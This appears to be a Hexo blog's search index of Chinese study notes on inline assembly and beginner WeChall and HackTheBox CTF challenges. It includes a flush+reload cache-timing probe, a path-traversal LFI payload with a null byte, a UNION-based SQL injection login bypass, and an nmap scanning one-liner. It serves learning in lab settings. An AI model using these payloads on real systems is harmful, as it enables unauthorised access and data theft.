<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ARM内联汇编</title>
    <url>/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<h2 id="gcc-ARM内联汇编-与-预处理"><a href="#gcc-ARM内联汇编-与-预处理" class="headerlink" title="gcc ARM内联汇编 与 预处理"></a>gcc ARM内联汇编 与 预处理</h2><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>define 编译<code>预处理</code>时，对程序中所有出现的“宏名”，都用宏定义中的字符串去代换</p>
<p><code>#</code>开头都是预编译指令</p>
<a id="more"></a>
<pre><code>#ifndef HEADER_FILE
#define HEADER_FILE
the entire header file file
#endif</code></pre>
<p>这种结构就是通常所说的<code>包装器 #ifndef</code>。当再次引用头文件时，<code>条件为假</code>，因为 HEADER_FILE 已定义。此时，预处理器会<code>跳过</code>文件的整个内容，编译器会忽略它。</p>
<hr>
<p>您可以使用 typedef 为一个已有的类型取一个新的名字。下面是使用 typedef 定义一个新类型的语法：</p>
<pre><code>typedef struct config *config_t; //将config* 重新定为 config_t
typedef type newname; </code></pre>
<hr>
<h3 id="ARM内联汇编"><a href="#ARM内联汇编" class="headerlink" title="ARM内联汇编"></a>ARM内联汇编</h3><p>GCC编译器支持直接在C或者C++代码中，嵌入ARM汇编代码。其基本格式非常简单，大致如下：</p>
<pre><code>__asm__ [__volatile__] ( assembler template 
           : [output operand list]                  /* optional */
           : [input operand list]                   /* optional */
           : [clobbered register list]              /* optional */
           );</code></pre>
<p>每一个操作数由下列组成</p>
<pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre>
<p><code>name</code> 表示别名</p>
<p><code>限定符</code>constraint</p>
<pre><code>   &quot;a”将输入变量放入eax
   &quot;b”将输入变量放入ebx
 “c”将输入变量放入ecx
 “d”将输入变量放入edx
 “s”将输入变量放入esi
 “d”将输入变量放入edi</code></pre>
<p>GCC中定义了三个<code>修改符</code>modifier，分别是：<br>修改符    含义</p>
<pre><code>=    只写操作数，通常用于输出操作数中
+    可读且可写操作数，必须要列在输出操作数中
&amp;    寄存器只能用于输出</code></pre>
<p>编译器并不会分析你的汇编代码，找出这种被你修改过，需要恢复的寄存器，因此你必须显式的告诉编译器，被你修改过的寄存器有哪些。这就是<code>修改寄存器列表</code>所起到的作用。<br><code>clobbered register list</code></p>
<h3 id="示例-flush-and-reload"><a href="#示例-flush-and-reload" class="headerlink" title="示例__flush and reload"></a>示例__flush and reload</h3><pre><code>/*SFENCE——串行化发生在SFENCE指令之前的写操作但是不影响读操作。 
   LFENCE——串行化发生在SFENCE指令之前的读操作但是不影响写操作。 
   MFENCE——串行化发生在MFENCE指令之前的读写操作。
sfence:在sfence指令前的写操作当必须在sfence指令后的写操作前完成。
lfence：在lfence指令前的读操作当必须在lfence指令后的读操作前完成。 no instruction fol-lowing it executes before thelfenceinstruction
mfence：在mfence指令前的读写操作当必须在mfence指令后的读写操作前完成。
*/</code></pre>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">&quot;lfence\nrdtsc&quot;</span> : <span class="string">&quot;=a&quot;</span> (tl): : <span class="string">&quot;%edx&quot;</span>); <span class="comment">//“__volatile__”关键字，这个是可选的，</span></span><br><span class="line">  <span class="comment">//其作用是禁止编译器对后面编写的汇编指令再进行优化</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">&quot;  mfence             \n&quot;</span> <span class="comment">//cpuid (intel) 虚拟机会模拟该指令，导致时间增加</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">&quot;  movl %%eax, %%esi  \n&quot;</span> <span class="comment">//把rdtsc返回的时间传入ESI保存</span></span><br><span class="line">    <span class="string">&quot;  movl (%1), %%eax   \n&quot;</span> <span class="comment">//%1表示adrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">&quot;  lfence             \n&quot;</span> <span class="comment">//（）表示指针</span></span><br><span class="line">    <span class="string">&quot;  rdtsc              \n&quot;</span></span><br><span class="line">    <span class="string">&quot;  subl %%esi, %%eax  \n&quot;</span> <span class="comment">//rdtsc返回值保存在eax.相减，结果保存在eax</span></span><br><span class="line">    <span class="string">&quot;  clflush 0(%1)      \n&quot;</span> <span class="comment">//()剔除缓存中的值</span></span><br><span class="line">    : <span class="string">&quot;=a&quot;</span> (time)</span><br><span class="line">    : <span class="string">&quot;c&quot;</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">&quot;%esi&quot;</span>, <span class="string">&quot;%edx&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL</title>
    <url>/2020/05/15/CTF%E5%85%A5%E9%97%A8%20WECALL/</url>
    <content><![CDATA[<p>初学CTF 入门太难</p>
<h2 id="wecall-challenges-解决方法"><a href="#wecall-challenges-解决方法" class="headerlink" title="wecall challenges 解决方法"></a>wecall challenges 解决方法</h2><h4 id="training-steganoI"><a href="#training-steganoI" class="headerlink" title="training steganoI"></a>training steganoI</h4><p>$cat  xxx.bmp<br><a href="https://www.tecmint.com/13-basic-cat-command-examples-in-linux/">https://www.tecmint.com/13-basic-cat-command-examples-in-linux/</a></p>
<h4 id="Crypto-Caesar-I"><a href="#Crypto-Caesar-I" class="headerlink" title="Crypto - Caesar I"></a>Crypto - Caesar I</h4><p>python函数 list() ord() chr()</p>
<a id="more"></a>

<h4 id="WWW-Robots"><a href="#WWW-Robots" class="headerlink" title="WWW-Robots"></a>WWW-Robots</h4><p>robots.txt<br>The robots.txt file is used by web crawlers to check if they are allowed to crawl and index your website or only parts of it.<br>Sometimes these files reveal the directory structure instead protecting the content from being crawled.</p>
<h4 id="URL-ENCODE"><a href="#URL-ENCODE" class="headerlink" title="URL ENCODE"></a>URL ENCODE</h4><p>URL encoding replaces unsafe ASCII characters with a “%” followed by two hexadecimal digits. 十六进制<br>URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.<br>URLs can only be sent over the Internet using the ASCII character-set.</p>
<h4 id="python-3-7"><a href="#python-3-7" class="headerlink" title="python 3.7"></a>python 3.7</h4><p>from urllib.parse import unquote<br>tar -xf 解压缩 ？自动识别<br>java -jar </p>
<h4 id="Training-Programming-1"><a href="#Training-Programming-1" class="headerlink" title="Training: Programming 1"></a>Training: Programming 1</h4><p>urllib.request</p>
<p>urlopen返回的是二进制数据，decode(‘utf-8’)解码</p>
<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://zh.wikipedia.org/wiki/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p>
<p>‘weshall’</p>
<p>wechall4?.(jpg|gif|tiff|bmp|png)</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL 2</title>
    <url>/2020/05/19/CTF%E5%85%A5%E9%97%A8%20WECALL1/</url>
    <content><![CDATA[<h3 id="什么是PHP文件？"><a href="#什么是PHP文件？" class="headerlink" title="什么是PHP文件？"></a>什么是PHP文件？</h3><p>PHP文件可以包含文本，HTML，CSS，JavaScript和PHP代码<br>PHP代码在服务器上执行，结果以纯HTML格式返回到浏览器<br>PHP文件的扩展名为“ .php”</p>
<a id="more"></a>
<h3 id="PHP可以做什么？"><a href="#PHP可以做什么？" class="headerlink" title="PHP可以做什么？"></a>PHP可以做什么？</h3><p>PHP可以生成动态页面内容<br>PHP可以在服务器上创建，打开，读取，写入，删除和关闭文件<br>PHP可以收集表单数据<br>PHP可以发送和接收Cookie<br>PHP可以添加，删除，修改数据库中的数据<br>PHP可用于控制用户访问<br>PHP可以加密数据<br>使用PHP，您不仅可以输出HTML。您可以输出图像，PDF文件甚至Flash电影。您还可以输出任何文本，例如XHTML和XML。</p>
<p>PHP脚本可以放在文档中的任何位置。<br>PHP脚本的开头<code>&lt;?php</code>和结尾是<code> ?&gt;</code>：<br><?php
// PHP code goes here
?><br>PHP文件的默认文件扩展名是“ .php”。<br>一个PHP文件通常包含HTML标记和一些PHP脚本代码。</p>
<p> PHP语句以分号（<code>;</code>）结尾。</p>
<p>在PHP中，关键字（例如if， else，while， echo等），类，函数，和用户定义的函数<code>是不区分大小写。</code></p>
<p>所有<code>变量名称均区分大小写</code>！</p>
<p>comment<br>//<br>#<br>/*        */</p>
<p>在PHP中，变量以$符号开头，后跟变量名称</p>
<p>与其他编程语言不同，PHP没有用于声明变量的命令。它是在您首次为其分配值时创建的。</p>
<?php
$txt = "W3Schools.com";
echo "I love $txt!";
?>

<?php
$txt = "W3Schools.com";
echo "I love " . $txt . "!";
?>

<?php
$x = 5;
$y = 4;
echo $x + $y;
?>

<h5 id="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"><a href="#在函数外部声明的变量具有全局范围，并且只能在函数外部访问" class="headerlink" title="在函数外部声明的变量具有全局范围，并且只能在函数外部访问"></a>在函数外部声明的变量具有全局范围，并且只能在函数外部访问</h5><h5 id="在函数内声明的变量具有局部范围，只能在该函数内访问"><a href="#在函数内声明的变量具有局部范围，只能在该函数内访问" class="headerlink" title="在函数内声明的变量具有局部范围，只能在该函数内访问"></a>在函数内声明的变量具有局部范围，只能在该函数内访问</h5><h5 id="global关键字用于在函数内部访问一个全局变量。"><a href="#global关键字用于在函数内部访问一个全局变量。" class="headerlink" title="global关键字用于在函数内部访问一个全局变量。"></a>global关键字用于在函数内部访问一个全局变量。</h5><p>为此，请global在变量之前（在函数内部）使用关键字<br><?php
$x = 5;
$y = 10;
function myTest() {
  global $x, $y;
  $y = $x + $y;
}
myTest();
echo $y; // outputs 15
?></p>
<p>PHP also stores all global variables in an array called $GLOBALS[index]. The index holds the name of the variable. This array is also accessible from within functions and can be used to update global variables directly.</p>
<?php
$x = 5;
$y = 10;
function myTest() {
  $GLOBALS['y'] = $GLOBALS['x'] + $GLOBALS['y'];
}
myTest();
echo $y; // outputs 15
?>

<p>通常，当一个函数完成/执行时，它的所有变量都会被删除。但是，有时我们希望不删除局部变量。我们需要它来做进一步的工作。<br>为此，请static在首次声明变量时使用关键字<br>然后，每次调用该函数时，该变量仍将具有自上次调用该函数以来所包含的信息。<br>注意：该变量仍然是函数的局部变量。</p>
<p>差异很小：echo没有返回值，而print返回值为1，因此可以在表达式中使用。echo可以采用多个参数（尽管这种用法很少见），而print可以采用一个参数。echo比快一点print。</p>
<?php
echo "<h2>PHP is Fun!</h2>";
echo "Hello world!<br>";
echo "I'm about to learn PHP!<br>";
echo "This ", "string ", "was ", "made ", "with multiple parameters.";
?>

<h5 id="字符串可以是引号内的任何文本。可以使用单引号或双引号"><a href="#字符串可以是引号内的任何文本。可以使用单引号或双引号" class="headerlink" title="字符串可以是引号内的任何文本。可以使用单引号或双引号"></a>字符串可以是引号内的任何文本。可以使用单引号或双引号</h5><p>整数数据类型是-2,147,483,648和2,147,483,647之间的非十进制数。<br>PHP var_dump（）函数返回数据类型和值</p>
<?php
$cars = array("Volvo","BMW","Toyota");
var_dump($cars);
?>

<p>首先，我们必须声明一个对象类。为此，我们使用class关键字。类是可以包含属性和方法的结构：<br><?php
class Car {
  function Car() {
    $this->model = "VW";
  }
}
// create an object
$herbie = new Car();
// show object properties
echo $herbie->model;
?></p>
<p>如果创建的变量没有值，则会自动为其分配值NULL。<br>也可以通过将值设置为NULL来清空变量：</p>
<p>关于PHP的注意事项之一是它提供了自动数据类型转换。<br>因此，如果将整数值分配给变量，则该变量的类型将自动为整数。然后，如果将字符串分配给相同的变量，则类型将更改为字符串。</p>
<p>整数可以以三种格式指定：十进制（基于10的），十六进制（基于16的-带有0x前缀）或八进制（基于8的-带有0前缀）</p>
<p>（int），（integer）或intval（）函数通常用于将值转换为整数。</p>
<p>有效的常量名称以字母或下划线开头（常量名称前没有$符号）。</p>
<p>注意：与变量不同，常量在整个脚本中自动为全局变量。<br>define(name, value, case-insensitive)<br>在PHP7中，您可以使用define()函数创建一个Array常量。</p>
<p>.    Concatenation    $txt1 . $txt2    Concatenation of $txt1 and $txt2<br>.=    Concatenation assignment    $txt1 .= $txt2    Appends $txt2 to $txt1</p>
<?php
$t = date("H");

if ($t < "20") {
  echo "Have a good day!";
}
?>

<h4 id="该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。"><a href="#该foreach循环仅适用于数组，用于循环遍历数组中的每个键-值对。" class="headerlink" title="该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。"></a>该foreach循环仅适用于数组，用于循环遍历数组中的每个键/值对。</h4><p>句法<br>foreach ($array as $value) {<br>  code to be executed;<br>}<br>对于每次循环迭代，当前数组元素的值都分配给$ value，并且数组指针移动一个，直到到达最后一个数组元素。</p>
<p>要指定，strict我们需要设置declare(strict_types=1);。这必须在PHP文件的第一行。<br>这为我们提供了一个在声明函数时指定所需数据类型的选项，并且通过添加strict 声明，如果数据类型不匹配，它将抛出“致命错误”。</p>
<?php declare(strict_types=1); // strict requirement
function addNumbers(float $a, float $b) : float {
  return $a + $b;
}
echo addNumbers(1.2, 5.2);
?>

<?php declare(strict_types=1); // strict requirement
function addNumbers(float $a, float $b) : int {
  return (int)($a + $b);
}
echo addNumbers(1.2, 5.2);
?>

<?php
$cars = array("Volvo", "BMW", "Toyota");
echo "I like " . $cars[0] . ", " . $cars[1] . " and " . $cars[2] . ".";
?>

<p>关联数组是使用分配给它们的命名键的数组。<br>有两种创建关联数组的方法：<br>$age = array(“Peter”=&gt;”35”, “Ben”=&gt;”37”, “Joe”=&gt;”43”);<br>要么：<br>$age[‘Peter’] = “35”;<br>$age[‘Ben’] = “37”;<br>$age[‘Joe’] = “43”;<br>然后可以在脚本中使用命名的键：</p>
<p>$cars = array (<br>  array(“Volvo”,22,18),<br>  array(“BMW”,15,13),<br>  array(“Saab”,5,2),<br>  array(“Land Rover”,17,15)<br>);<br><?php
echo $cars[0][0].": In stock: ".$cars[0][1].", sold: ".$cars[0][2].".<br>";
echo $cars[1][0].": In stock: ".$cars[1][1].", sold: ".$cars[1][2].".<br>";
echo $cars[2][0].": In stock: ".$cars[2][1].", sold: ".$cars[2][2].".<br>";
echo $cars[3][0].": In stock: ".$cars[3][1].", sold: ".$cars[3][2].".<br>";
?></p>
<p>sort() -以升序排列数组<br>rsort() -以降序排列数组<br>asort() -根据值以升序对关联数组进行排序<br>ksort() -根据键以升序对关联数组进行排序<br>arsort() -根据值以降序对关联数组进行排序<br>krsort() -根据键以降序对关联数组进行排序</p>
<h4 id="用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。"><a href="#用于在使用method-“-post”提交HTML表单后收集表单数据。-POST也广泛用于传递变量。" class="headerlink" title="用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。"></a>用于在使用method =“ post”提交HTML表单后收集表单数据。$ _POST也广泛用于传递变量。</h4><h5 id="SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script"><a href="#SERVER-‘PHP-SELF’-Returns-the-filename-of-the-currently-executing-script" class="headerlink" title="$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script"></a>$_SERVER[‘PHP_SELF’]    Returns the filename of the currently executing script</h5><h5 id="SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST"><a href="#SERVER-‘REQUEST-METHOD’-Returns-the-request-method-used-to-access-the-page-such-as-POST" class="headerlink" title="$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)"></a>$_SERVER[‘REQUEST_METHOD’]    Returns the request method used to access the page (such as POST)</h5><h4 id="PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。"><a href="#PHP-GET是一个PHP超级全局变量，用于在使用method-“-get”提交HTML表单后收集表单数据。" class="headerlink" title="PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。"></a>PHP $ _GET是一个PHP超级全局变量，用于在使用method =“ get”提交HTML表单后收集表单数据。</h4><h5 id="GET还可以收集在URL中发送的数据。"><a href="#GET还可以收集在URL中发送的数据。" class="headerlink" title="$ _GET还可以收集在URL中发送的数据。"></a>$ _GET还可以收集在URL中发送的数据。</h5><h4 id="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"><a href="#使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。" class="headerlink" title="使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。"></a>使用GET方法从表单发送的信息对所有人都是可见的（所有变量名和值都显示在URL中）。GET对发送的信息量也有限制。限制约为2000个字符。但是，由于变量显示在URL中，因此可以为页面添加书签。在某些情况下这可能很有用。</h4><p>GET可以用于发送非敏感数据。<br>注意：绝对不要将GET用于发送密码或其他敏感信息！</p>
<h5 id="使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"><a href="#使用POST方法从表单发送的信息对于其他人是不可见的-（所有名称-值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。" class="headerlink" title="使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。"></a>使用POST方法从表单发送的信息对于其他人是不可见的 （所有名称/值都嵌入在HTTP请求的正文中），并且对要发送的信息量没有限制。</h5><p>此外，POST支持高级功能，例如在将文件上传到服务器时支持多部分二进制输入。<br>但是，由于变量未显示在URL中，因此无法为页面添加书签。</p>
<h5 id="SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"><a href="#SERVER-“-PHP-SELF”-将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。" class="headerlink" title="$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。"></a>$ _ SERVER [“ PHP_SELF”]将提交的表单数据发送到页面本身，而不是跳转到另一个页面。这样，用户将在与表单相同的页面上收到错误消息。</h5><p>htmlspecialchars（）函数将特殊字符转换为HTML实体。这意味着它将用＆lt;替换&lt;和&gt;之类的HTML字符。和＆gt;。这样可以防止攻击者通过以表格形式注入HTML或Javascript代码（跨站点脚本攻击）来利用代码。</p>
<h5 id="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）"><a href="#从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP-trim（）函数）" class="headerlink" title="从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）"></a>从用户输入数据中删除不必要的字符（多余的空格，制表符，换行符）（使用PHP trim（）函数）</h5><h5 id="从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）"><a href="#从用户输入数据中删除反斜杠（-）（使用PHP-stripslashes（）函数）" class="headerlink" title="从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）"></a>从用户输入数据中删除反斜杠（\）（使用PHP stripslashes（）函数）</h5><p>使用PHP empty() 函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_SERVER</span>[&quot;</span>PHP_SELF<span class="string">&quot;]);?&gt;&quot;</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;* &lt;?php echo $nameErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">E-mail:</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;* &lt;?php echo $emailErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Website:</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;website&quot;</span>&gt;</span><br><span class="line">&lt;span class=&quot;error&quot;&gt;&lt;?php echo $websiteErr;?&gt;&lt;/span&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Comment: &lt;textarea name=<span class="string">&quot;comment&quot;</span> rows=<span class="string">&quot;5&quot;</span> cols=<span class="string">&quot;40&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>preg_match（）函数在字符串中搜索模式，如果存在模式，则返回true，否则返回false。<br>正则表达式</p>
<p>include和require语句相同，但失败时除外：<br>require 将产生致命错误（E_COMPILE_ERROR）并停止脚本</p>
<h5 id="include-只会产生警告（E-WARNING）并且脚本将继续"><a href="#include-只会产生警告（E-WARNING）并且脚本将继续" class="headerlink" title="include 只会产生警告（E_WARNING）并且脚本将继续"></a>include 只会产生警告（E_WARNING）并且脚本将继续</h5><p>该readfile()函数读取文件并将其写入输出缓冲区。</p>
<?php
$myfile = fopen("webdictionary.txt", "r") or die("Unable to open file!");
echo fread($myfile,filesize("webdictionary.txt"));
fclose($myfile);
?>

<p>该fclose()功能用于关闭打开的文件。<br>结束所有文件后，关闭所有文件是一种良好的编程习惯。您不希望在服务器上到处运行打开的文件占用资源！</p>
<p>该feof()功能检查是否已达到“文件结尾”（EOF）。</p>
<p>该fopen()函数还用于创建文件。可能有些混乱，但是在PHP中，使用与打开文件相同的功能创建文件。</p>
<p>$filename = ‘pages/‘.(isset($_GET[“file”])$_GET[“file”]:”welcome”).’.html’;</p>
<p>？ ：</p>
<h5 id="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"><a href="#isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。" class="headerlink" title="isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。"></a>isset（）函数检查是否设置了变量，这意味着必须声明该变量并且该变量不能为NULL。</h5><p>die（）函数是exit（）函数的别名。</p>
<h5 id="eval（）函数将字符串评估为PHP代码。"><a href="#eval（）函数将字符串评估为PHP代码。" class="headerlink" title="eval（）函数将字符串评估为PHP代码。"></a>eval（）函数将字符串评估为PHP代码。</h5><h5 id="dirname（）函数返回父目录的路径。"><a href="#dirname（）函数返回父目录的路径。" class="headerlink" title="dirname（）函数返回父目录的路径。"></a>dirname（）函数返回父目录的路径。</h5><h5 id="in-array（）函数在数组中搜索特定值。"><a href="#in-array（）函数在数组中搜索特定值。" class="headerlink" title="in_array（）函数在数组中搜索特定值。"></a>in_array（）函数在数组中搜索特定值。</h5><p>注意：如果搜索参数是字符串，并且类型参数设置为TRUE，则搜索区分大小写。</p>
<h3 id="WECHALL-LFI"><a href="#WECHALL-LFI" class="headerlink" title="WECHALL LFI"></a>WECHALL LFI</h3><p>?file=page/jhkd.html<br>?file=../../solution.php%00<br>%00 后的字符不算，已经更改<br>../ 遍历目录</p>
<p>switch ($which)<br>        {<br>        case 0:<br>        case 1:<br>        case 2:<br>                require_once $which.’.php’;<br>                break;<br>        default:<br>                echo GWF_HTML::error(‘PHP-0817’, ‘Hacker NoNoNo!’, false);<br>                break;<br>        }<br>which=0,1,2 都执行require_once</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL2-正则</title>
    <url>/2020/07/06/CTF%E5%85%A5%E9%97%A8%20WECALL2/</url>
    <content><![CDATA[<p>python3<br>list()   一个字符字符分</p>
<hr>
<p>child[a],child[b] = child[b],child[a]</p>
<h5 id="交换位置"><a href="#交换位置" class="headerlink" title="交换位置"></a>交换位置</h5><a id="more"></a>
<hr>
<p>spilt() 按空格分<br>int()</p>
<hr>
<h3 id="Training-Crypto-Substitution-I"><a href="#Training-Crypto-Substitution-I" class="headerlink" title="Training: Crypto - Substitution I"></a>Training: Crypto - Substitution I</h3><p><a href="http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/">http://practicalcryptography.com/cryptanalysis/text-characterisation/quadgrams/</a></p>
<h3 id="Training-Crypto-Caesar-II"><a href="#Training-Crypto-Caesar-II" class="headerlink" title="Training: Crypto - Caesar II"></a>Training: Crypto - Caesar II</h3><p>import sys<br>sys.stdout = open(‘/root/Documents/CTF_WECALL/results.py’, mode = ‘w’,encoding=’utf-8’)</p>
<p>打印到文件中</p>
<p>line breaks. 换行符</p>
<p>vscode python 整段右移 选中tab</p>
<hr>
<h3 id="python-2-转到-3"><a href="#python-2-转到-3" class="headerlink" title="python 2 转到 3"></a>python 2 转到 3</h3><p>2to3.py</p>
<hr>
<h3 id="正则30分钟学习"><a href="#正则30分钟学习" class="headerlink" title="正则30分钟学习"></a>正则30分钟学习</h3><p><a href="https://deerchao.cn/tutorials/regex/regex.htm">https://deerchao.cn/tutorials/regex/regex.htm</a></p>
<h3 id="wechall-mysql-2"><a href="#wechall-mysql-2" class="headerlink" title="wechall mysql 2"></a>wechall mysql 2</h3><p>‘ union select 1,’admin’ ,md5(‘1’)  from users where username =’admin’#</p>
<p><code>？？可以随便选择</code></p>
<h3 id="wechall-WWW-Basics"><a href="#wechall-WWW-Basics" class="headerlink" title="wechall WWW-Basics"></a>wechall WWW-Basics</h3><p>lsof -i:端口号 用于查看某一端口的占用情况，比如查看8000端口使用情况，lsof -i:8000</p>
<p>nginx -s quit<br>ps -ax | grep nginx<br>lsof -i:80<br>ip add</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF入门 WECALL4+hackthebox-REVERSE</title>
    <url>/2020/07/11/CTF%E5%85%A5%E9%97%A8%20WECALL4+hackthebox-REVERSE/</url>
    <content><![CDATA[<h4 id="wechall-register-globals"><a href="#wechall-register-globals" class="headerlink" title="wechall register_globals"></a>wechall register_globals</h4><p>register_globals 在php 5.4.0 后被移除 其会自动生成各种变量 如html请求变量<br><a href="http://1.1.1.1/report.asp?id=123&amp;kehu=222">http://1.1.1.1/report.asp?id=123&amp;kehu=222</a><br>login[0]=admin 直接login=admin 只取第一第二个字符</p>
<hr>
<h4 id="hackthebox"><a href="#hackthebox" class="headerlink" title="hackthebox"></a>hackthebox</h4><p>invite challenge 浏览器console 下运行函数 加（）<br>curl -X POST https://…</p>
<a id="more"></a>
<hr>
<h4 id="hackthebox-–-Enumeration"><a href="#hackthebox-–-Enumeration" class="headerlink" title="hackthebox – Enumeration"></a>hackthebox – Enumeration</h4><p>ports=$(nmap -p- –min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d ‘/‘ -f 1 | tr ‘\n’ ‘,’ | sed s/,$//)<br>nmap -sC -sV -p$ports 10.10.10.27</p>
<p>command 1 | command 2 把第一个命令command 1执行的结果作为command 2的输入传给command 2<br>-T4 可以加快执行速度<br>-p- 扫描所有端口<br>-min-rate 1000 to request that Nmap send at least 1,000 packets per secondcut<br>cut Print selected parts of lines from each FILE to standard output.<br>-f 指定第一列 -d 指定列分隔符<br> tr 命令用于转换或删除文件中的字符 ‘\n’ 转换为‘，’<br>sed ‘s/regexp/replacement/flags’.<br>Its basic concept is simple: the s command attempts to match the pattern space against the supplied regular expression regexp; if the match is successful, then that portion of the pattern space which was matched is replaced with replacement.<br>regexp匹配成功后用replace替代</p>
<p>select IS_SRVROLEMEMBER (‘sysadmin’)</p>
<hr>
<p>remote code execution (RCE)</p>
<h4 id="A-reverse-shell"><a href="#A-reverse-shell" class="headerlink" title="A reverse shell"></a>A reverse shell</h4><p>is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.</p>
